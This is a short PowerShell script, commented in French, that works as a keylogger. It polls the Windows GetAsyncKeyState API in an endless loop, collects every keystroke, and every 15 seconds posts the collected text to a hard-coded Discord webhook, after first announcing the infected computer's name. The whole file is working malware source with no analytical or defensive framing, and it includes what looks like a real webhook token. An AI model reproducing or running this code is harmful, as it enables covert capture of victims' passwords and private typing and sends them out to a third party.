$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

# Message de démarrage
iwr $webhook -Method Post -Body (@{content="Keylogger lancé – $env:COMPUTERNAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

$code = @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int k);
}
'@

Add-Type $code

$buffer = ''
$lastSend = Get-Date

while($true) {
    Start-Sleep -m 30
    
    # Capture toutes les touches
    for($i=8;$i -le 254;$i++) {
        if([K]::GetAsyncKeyState($i) -eq -32767) {
            $buffer += [char]$i
        }
    }

    # Envoi FORCÉ toutes les 15 secondes
    if(((Get-Date) - $lastSend).TotalSeconds -ge 15) {
        if($buffer.Length -gt 0) {
            iwr $webhook -Method Post -Body (@{content=$buffer}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        } else {
            iwr $webhook -Method Post -Body (@{content="[heartbeat]"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
        }
        $buffer = ''
        $lastSend = Get-Date
    }
}
